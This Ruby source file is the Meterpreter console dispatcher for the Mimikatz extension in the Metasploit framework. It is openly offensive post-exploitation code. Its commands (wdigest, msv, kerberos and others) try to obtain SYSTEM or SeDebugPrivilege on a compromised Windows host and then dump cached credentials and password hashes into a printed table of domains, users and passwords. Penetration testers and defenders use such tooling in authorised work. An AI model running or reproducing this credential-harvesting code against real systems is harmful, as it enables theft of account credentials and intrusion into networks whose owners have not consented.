# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Privilege escalation extension user interface.
#
###
class Console::CommandDispatcher::Mimikatz

	Klass = Console::CommandDispatcher::Mimikatz

	include Console::CommandDispatcher

	#
	# Initializes an instance of the priv command interaction.
	#
	def initialize(shell)
		super
	end

	#
	# List of supported commands.
	#
	def commands
		{
			"wdigest" => "Attempt to retrieve wdigest creds",
			"msv" => "Attempt to retrieve msv creds (hashes)",
			"livessp" => "Attempt to retrieve livessp creds",
			"ssp" => "Attempt to retrieve ssp creds",
			"tspkg" => "Attempt to retrieve tspkg creds",
			"kerberos" => "Attempt to retrieve kerberos creds"
		}
	end

	def mimikatz_request(provider, method)
		get_privs
		print_status("Retrieving #{provider} credentials")
		accounts = method.call

		table = Rex::Ui::Text::Table.new(
			'Header' => "#{provider} credentials",
			'Indent' => 0,
			'SortIndex' => 4,
			'Columns' =>
			[
				'AuthID', 'Package', 'Domain', 'User', 'Password'
			]
		)

		accounts.each do |acc|
			table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]
		end

		table.print

		return true
	end

	def cmd_wdigest(*args)
		method = Proc.new { client.mimikatz.wdigest }
		mimikatz_request("wdigest", method)
	end

	def cmd_msv(*args)
		method = Proc.new { client.mimikatz.msv }
		mimikatz_request("msv", method)
	end

	def cmd_livessp(*args)
		method = Proc.new { client.mimikatz.livessp }
		mimikatz_request("livessp", method)
	end

	def cmd_ssp(*args)
		method = Proc.new { client.mimikatz.ssp }
		mimikatz_request("ssp", method)
	end

	def cmd_tspkg(*args)
		method = Proc.new { client.mimikatz.tspkg }
		mimikatz_request("tspkg", method)
	end

	def cmd_kerberos(*args)
		method = Proc.new { client.mimikatz.kerberos }
		mimikatz_request("kerberos", method)
	end

	def get_privs
		unless system_check
			print_status("Attempting to getprivs")
			privs = client.sys.config.getprivs
			unless privs.include? "SeDebugPrivilege"
				print_warning("Did not get SeDebugPrivilege")
			else
				print_good("Got SeDebugPrivilege")
			end
		else
			print_good("Running as SYSTEM")
		end
	end

	def system_check
		unless (client.sys.config.getuid == "NT AUTHORITY\\SYSTEM")
			print_warning("Not currently running as SYSTEM")
			return false
		end

		return true
	end

	#
	# Name for this dispatcher
	#
	def name
		"Mimikatz"
	end
end

end
end
end
end

